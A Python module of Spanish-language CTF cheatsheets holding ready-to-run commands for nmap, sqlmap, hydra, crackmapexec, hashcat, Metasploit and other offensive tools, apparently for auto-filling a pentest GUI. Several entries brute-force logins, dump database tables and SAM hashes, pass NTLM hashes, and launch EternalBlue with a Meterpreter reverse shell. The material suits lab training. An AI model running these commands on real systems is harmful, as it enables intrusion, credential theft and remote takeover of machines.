"""
Cheatsheets para cada herramienta — ejemplos reales de CTF.
Cada entrada tiene: título, descripción, comando de ejemplo y params
para rellenar el formulario automáticamente al hacer clic.
"""

CHEATSHEETS = {
    "nmap": [
        {
            "title": "Descubrimiento rápido de hosts",
            "desc": "Ping scan para ver qué máquinas están vivas en la red",
            "cmd": "nmap -sn 192.168.1.0/24",
            "params": {"target": "192.168.1.0/24", "scan_type": "-sn", "timing": "-T4"},
        },
        {
            "title": "Escaneo inicial CTF",
            "desc": "Top 1000 puertos con detección de versiones, rápido",
            "cmd": "nmap -sV -T4 --open 10.10.10.10",
            "params": {"target": "10.10.10.10", "scan_type": "-sV", "timing": "-T4", "extra_flags": "--open"},
        },
        {
            "title": "Escaneo completo de puertos",
            "desc": "Todos los 65535 puertos — no te pierdas nada",
            "cmd": "nmap -p- -T4 10.10.10.10",
            "params": {"target": "10.10.10.10", "scan_type": "-sV", "timing": "-T4", "ports": "1-65535"},
        },
        {
            "title": "Scripts de vulnerabilidades",
            "desc": "Lanzar scripts NSE de vuln contra un objetivo",
            "cmd": "nmap -sV --script vuln 10.10.10.10",
            "params": {"target": "10.10.10.10", "scan_type": "-sV", "timing": "-T3", "scripts": "vuln"},
        },
        {
            "title": "Enumeración SMB",
            "desc": "Scripts específicos para enumerar SMB/Samba",
            "cmd": "nmap -p 445 --script smb-enum-shares,smb-enum-users 10.10.10.10",
            "params": {"target": "10.10.10.10", "scan_type": "-sV", "timing": "-T3", "ports": "445", "scripts": "smb-enum-shares,smb-enum-users"},
        },
        {
            "title": "Detección de OS (agresiva)",
            "desc": "Detección de sistema operativo + scripts + traceroute",
            "cmd": "nmap -A 10.10.10.10",
            "params": {"target": "10.10.10.10", "scan_type": "-A", "timing": "-T4"},
        },
    ],

    "gobuster": [
        {
            "title": "Fuzzing básico de directorios",
            "desc": "El primer paso en cualquier CTF web — buscar rutas ocultas",
            "cmd": "gobuster dir -u http://10.10.10.10 -w /usr/share/wordlists/dirb/common.txt",
            "params": {"mode": "dir", "url": "http://10.10.10.10", "wordlist": "/usr/share/wordlists/dirb/common.txt", "threads": "20"},
        },
        {
            "title": "Buscar ficheros PHP/HTML",
            "desc": "Añadir extensiones para encontrar ficheros concretos",
            "cmd": "gobuster dir -u http://10.10.10.10 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,bak",
            "params": {"mode": "dir", "url": "http://10.10.10.10", "wordlist": "/usr/share/wordlists/dirb/common.txt", "extensions": "php,html,txt,bak", "threads": "20"},
        },
        {
            "title": "Enumeración de subdominios",
            "desc": "Descubrir subdominios de un dominio",
            "cmd": "gobuster dns -u http://example.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt",
            "params": {"mode": "dns", "url": "http://example.com", "wordlist": "/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt"},
        },
        {
            "title": "Con autenticación (cookie)",
            "desc": "Fuzzing en áreas protegidas con sesión activa",
            "cmd": "gobuster dir -u http://10.10.10.10/admin -w /usr/share/wordlists/dirb/common.txt -c 'session=abc123'",
            "params": {"mode": "dir", "url": "http://10.10.10.10/admin", "wordlist": "/usr/share/wordlists/dirb/common.txt", "cookie": "session=abc123"},
        },
    ],

    "nikto": [
        {
            "title": "Escaneo básico",
            "desc": "Análisis rápido de vulnerabilidades y configuraciones web",
            "cmd": "nikto -h http://10.10.10.10",
            "params": {"target": "http://10.10.10.10"},
        },
        {
            "title": "Escaneo HTTPS",
            "desc": "Objetivo con SSL/TLS",
            "cmd": "nikto -h 10.10.10.10 -ssl -p 443",
            "params": {"target": "10.10.10.10", "port": "443", "ssl": True},
        },
        {
            "title": "Solo inyecciones (XSS/SQLi)",
            "desc": "Centrar el escaneo en tests de inyección",
            "cmd": "nikto -h http://10.10.10.10 -Tuning 4",
            "params": {"target": "http://10.10.10.10", "tuning": ["4"]},
        },
    ],

    "sqlmap": [
        {
            "title": "Detección básica de SQLi",
            "desc": "Primer test — ¿hay inyección SQL?",
            "cmd": "sqlmap -u 'http://10.10.10.10/page?id=1' --batch",
            "params": {"url": "http://10.10.10.10/page?id=1", "batch": True, "level": "1", "risk": "1"},
        },
        {
            "title": "Enumerar bases de datos",
            "desc": "Una vez confirmada la inyección, listar BDs",
            "cmd": "sqlmap -u 'http://10.10.10.10/page?id=1' --dbs --batch",
            "params": {"url": "http://10.10.10.10/page?id=1", "dbs": True, "batch": True},
        },
        {
            "title": "Volcar tabla users",
            "desc": "Extraer los datos de una tabla concreta",
            "cmd": "sqlmap -u 'http://10.10.10.10/page?id=1' --dump -D mydb --batch",
            "params": {"url": "http://10.10.10.10/page?id=1", "dump": True, "batch": True, "extra_flags": "-D mydb -T users"},
        },
        {
            "title": "Con sesión (POST + cookie)",
            "desc": "SQLi en formulario autenticado",
            "cmd": "sqlmap -u 'http://10.10.10.10/login' --data='user=admin&pass=test' --cookie='session=abc' --batch",
            "params": {"url": "http://10.10.10.10/login", "data": "user=admin&pass=test", "cookie": "session=abc", "batch": True},
        },
    ],

    "hydra": [
        {
            "title": "Fuerza bruta SSH",
            "desc": "Ataque de diccionario contra SSH",
            "cmd": "hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.10",
            "params": {"target": "10.10.10.10", "service": "ssh", "username": "admin", "passlist": "/usr/share/wordlists/rockyou.txt", "threads": "4"},
        },
        {
            "title": "Fuerza bruta FTP",
            "desc": "Ataque contra servicio FTP",
            "cmd": "hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ftp://10.10.10.10",
            "params": {"target": "10.10.10.10", "service": "ftp", "userlist": "/tmp/users.txt", "passlist": "/usr/share/wordlists/rockyou.txt"},
        },
        {
            "title": "Fuerza bruta HTTP POST",
            "desc": "Formulario de login web",
            "cmd": "hydra -l admin -P /usr/share/wordlists/rockyou.txt http-post-form://10.10.10.10",
            "params": {"target": "10.10.10.10", "service": "http-post-form", "username": "admin", "passlist": "/usr/share/wordlists/rockyou.txt", "threads": "8"},
        },
    ],

    "crackmapexec": [
        {
            "title": "Escanear red SMB",
            "desc": "Ver qué hosts tienen SMB activo y su versión",
            "cmd": "crackmapexec smb 192.168.1.0/24",
            "params": {"protocol": "smb", "target": "192.168.1.0/24"},
        },
        {
            "title": "Validar credenciales en toda la red",
            "desc": "Probar usuario/contraseña contra todos los hosts",
            "cmd": "crackmapexec smb 192.168.1.0/24 -u admin -p Password123",
            "params": {"protocol": "smb", "target": "192.168.1.0/24", "username": "admin", "password": "Password123", "continue_on_success": True},
        },
        {
            "title": "Pass-the-Hash",
            "desc": "Autenticación con hash NTLM sin necesitar la contraseña",
            "cmd": "crackmapexec smb 10.10.10.10 -u admin -H aad3b435b51404eeaad3b435b51404ee:31d6...",
            "params": {"protocol": "smb", "target": "10.10.10.10", "username": "admin", "hash": "aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0"},
        },
        {
            "title": "Listar shares SMB",
            "desc": "Ver carpetas compartidas de un host",
            "cmd": "crackmapexec smb 10.10.10.10 -u admin -p Password123 --shares",
            "params": {"protocol": "smb", "target": "10.10.10.10", "username": "admin", "password": "Password123", "action": "--shares"},
        },
        {
            "title": "Dump SAM (hashes locales)",
            "desc": "Extraer hashes locales (necesita admin)",
            "cmd": "crackmapexec smb 10.10.10.10 -u admin -p Password123 --sam",
            "params": {"protocol": "smb", "target": "10.10.10.10", "username": "admin", "password": "Password123", "action": "--sam"},
        },
    ],

    "john": [
        {
            "title": "Crackear hashes Linux (/etc/shadow)",
            "desc": "El clásico — crackear contraseñas de Linux",
            "cmd": "john --wordlist=/usr/share/wordlists/rockyou.txt shadow.txt",
            "params": {"hashfile": "/tmp/shadow.txt", "wordlist": "/usr/share/wordlists/rockyou.txt"},
        },
        {
            "title": "Crackear hash NTLM",
            "desc": "Hashes Windows obtenidos con mimikatz/secretsdump",
            "cmd": "john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt",
            "params": {"hashfile": "/tmp/hashes.txt", "wordlist": "/usr/share/wordlists/rockyou.txt", "format": "NT"},
        },
        {
            "title": "Con reglas de mutación",
            "desc": "Wordlist + reglas para variantes (P@ss, pass1, PASS...)",
            "cmd": "john --wordlist=/usr/share/wordlists/rockyou.txt --rules=Best64 hashes.txt",
            "params": {"hashfile": "/tmp/hashes.txt", "wordlist": "/usr/share/wordlists/rockyou.txt", "rules": "Best64"},
        },
        {
            "title": "Ver passwords ya crackeadas",
            "desc": "Mostrar las contraseñas que John ya crackeó antes",
            "cmd": "john --show hashes.txt",
            "params": {"hashfile": "/tmp/hashes.txt", "show": True},
        },
    ],

    "hashcat": [
        {
            "title": "Crackear MD5 con rockyou",
            "desc": "Ataque de diccionario contra hashes MD5",
            "cmd": "hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt",
            "params": {"hashfile": "/tmp/hashes.txt", "hash_type": "0", "attack_mode": "0", "wordlist": "/usr/share/wordlists/rockyou.txt"},
        },
        {
            "title": "Crackear NTLM",
            "desc": "Hashes Windows — mucho más rápido que John con GPU",
            "cmd": "hashcat -m 1000 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt",
            "params": {"hashfile": "/tmp/hashes.txt", "hash_type": "1000", "attack_mode": "0", "wordlist": "/usr/share/wordlists/rockyou.txt"},
        },
        {
            "title": "Crackear NetNTLMv2 (Responder)",
            "desc": "Hashes capturados con Responder en la red",
            "cmd": "hashcat -m 5600 -a 0 netntlm.txt /usr/share/wordlists/rockyou.txt",
            "params": {"hashfile": "/tmp/netntlm.txt", "hash_type": "5600", "attack_mode": "0", "wordlist": "/usr/share/wordlists/rockyou.txt"},
        },
        {
            "title": "Ataque de máscara (fuerza bruta)",
            "desc": "Si sabes el patrón: 8 chars, mayús+minús+dígito",
            "cmd": "hashcat -m 0 -a 3 hashes.txt ?u?l?l?l?l?l?d?d",
            "params": {"hashfile": "/tmp/hashes.txt", "hash_type": "0", "attack_mode": "3", "mask": "?u?l?l?l?l?l?d?d"},
        },
        {
            "title": "En VM sin GPU (--force)",
            "desc": "VirtualBox/VMware no tienen GPU — usar CPU con --force",
            "cmd": "hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt --force",
            "params": {"hashfile": "/tmp/hashes.txt", "hash_type": "0", "attack_mode": "0", "wordlist": "/usr/share/wordlists/rockyou.txt", "force": True},
        },
    ],

    "nc": [
        {
            "title": "Listener para reverse shell",
            "desc": "Esperar una conexión entrante de la víctima",
            "cmd": "nc -lvnp 4444",
            "params": {"mode": "listen", "listen_port": "4444", "verbose": True, "extra_flags": "-n"},
        },
        {
            "title": "Conectar a un puerto",
            "desc": "Conectarse manualmente a un servicio (banner grabbing)",
            "cmd": "nc -v 10.10.10.10 80",
            "params": {"mode": "connect", "host": "10.10.10.10", "port": "80", "verbose": True},
        },
        {
            "title": "Escaneo de puertos rápido",
            "desc": "Alternativa ligera a nmap para escaneo básico",
            "cmd": "nc -zv 10.10.10.10 1-1024",
            "params": {"mode": "scan", "host": "10.10.10.10", "port": "1-1024", "verbose": True},
        },
    ],

    "enum4linux": [
        {
            "title": "Enumeración completa SMB",
            "desc": "Todo de una vez: usuarios, shares, grupos, OS, políticas",
            "cmd": "enum4linux -a 10.10.10.10",
            "params": {"target": "10.10.10.10"},
        },
        {
            "title": "Solo usuarios y shares",
            "desc": "Enumeración rápida de lo más útil",
            "cmd": "enum4linux -U -S 10.10.10.10",
            "params": {"target": "10.10.10.10", "checks": ["U", "S"]},
        },
        {
            "title": "Con credenciales",
            "desc": "Enumeración autenticada — mucho más información",
            "cmd": "enum4linux -a -u admin -p Password123 10.10.10.10",
            "params": {"target": "10.10.10.10", "username": "admin", "password": "Password123"},
        },
    ],

    "wpscan": [
        {
            "title": "Escaneo básico WordPress",
            "desc": "Versión, plugins y themes vulnerables",
            "cmd": "wpscan --url http://10.10.10.10/wordpress",
            "params": {"url": "http://10.10.10.10/wordpress"},
        },
        {
            "title": "Enumerar usuarios",
            "desc": "Descubrir nombres de usuario registrados",
            "cmd": "wpscan --url http://10.10.10.10/wordpress --enumerate u",
            "params": {"url": "http://10.10.10.10/wordpress", "enumerate": ["u"]},
        },
        {
            "title": "Enumeración completa",
            "desc": "Usuarios + todos los plugins + todos los themes",
            "cmd": "wpscan --url http://10.10.10.10/wordpress --enumerate u,ap,at",
            "params": {"url": "http://10.10.10.10/wordpress", "enumerate": ["u", "ap", "at"]},
        },
        {
            "title": "Fuerza bruta de contraseñas",
            "desc": "Atacar el login de WordPress con wordlist",
            "cmd": "wpscan --url http://10.10.10.10/wordpress --enumerate u --passwords /usr/share/wordlists/rockyou.txt",
            "params": {"url": "http://10.10.10.10/wordpress", "enumerate": ["u"], "brute_users": True, "passwords": "/usr/share/wordlists/rockyou.txt"},
        },
    ],

    "msfconsole": [
        {
            "title": "Listener Meterpreter (Windows)",
            "desc": "Esperar una reverse shell de Windows",
            "cmd": "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 10.10.14.1; set LPORT 4444; run'",
            "params": {"module": "exploit/multi/handler", "payload": "windows/x64/meterpreter/reverse_tcp", "lhost": "10.10.14.1", "lport": "4444"},
        },
        {
            "title": "EternalBlue (MS17-010)",
            "desc": "Exploit SMB para Windows sin parchear — el clásico de CTF",
            "cmd": "msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 10.10.10.10; set LHOST 10.10.14.1; run'",
            "params": {"module": "exploit/windows/smb/ms17_010_eternalblue", "rhosts": "10.10.10.10", "lhost": "10.10.14.1", "lport": "4444"},
        },
        {
            "title": "Escanear MS17-010",
            "desc": "Verificar si el objetivo es vulnerable a EternalBlue",
            "cmd": "msfconsole -q -x 'use auxiliary/scanner/smb/smb_ms17_010; set RHOSTS 10.10.10.0/24; run'",
            "params": {"module": "auxiliary/scanner/smb/smb_ms17_010", "rhosts": "10.10.10.0/24"},
        },
    ],

    "volatility3": [
        {
            "title": "Info del sistema",
            "desc": "Primer paso — identificar el SO del volcado",
            "cmd": "volatility3 -f memory.dmp windows.info",
            "params": {"memdump": "/home/kali/memory.dmp", "plugin": "windows.info"},
        },
        {
            "title": "Lista de procesos",
            "desc": "Ver todos los procesos en memoria",
            "cmd": "volatility3 -f memory.dmp windows.pslist",
            "params": {"memdump": "/home/kali/memory.dmp", "plugin": "windows.pslist"},
        },
        {
            "title": "Procesos sospechosos (malfind)",
            "desc": "Detectar código inyectado o malware en memoria",
            "cmd": "volatility3 -f memory.dmp windows.malfind",
            "params": {"memdump": "/home/kali/memory.dmp", "plugin": "windows.malfind"},
        },
        {
            "title": "Dump de hashes (hashdump)",
            "desc": "Extraer hashes de contraseñas del SAM en memoria",
            "cmd": "volatility3 -f memory.dmp windows.hashdump",
            "params": {"memdump": "/home/kali/memory.dmp", "plugin": "windows.hashdump"},
        },
        {
            "title": "Conexiones de red",
            "desc": "Ver conexiones activas y puertos en escucha",
            "cmd": "volatility3 -f memory.dmp windows.netscan",
            "params": {"memdump": "/home/kali/memory.dmp", "plugin": "windows.netscan"},
        },
    ],
}
